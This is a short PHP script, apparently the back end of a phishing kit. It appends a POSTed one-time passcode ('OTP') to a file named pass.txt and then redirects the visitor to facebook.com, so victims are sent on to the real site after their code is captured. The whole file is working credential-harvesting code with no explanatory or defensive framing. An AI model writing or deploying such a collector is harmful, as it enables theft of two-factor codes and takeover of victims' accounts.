<?php

file_put_contents("pass.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com');
exit();
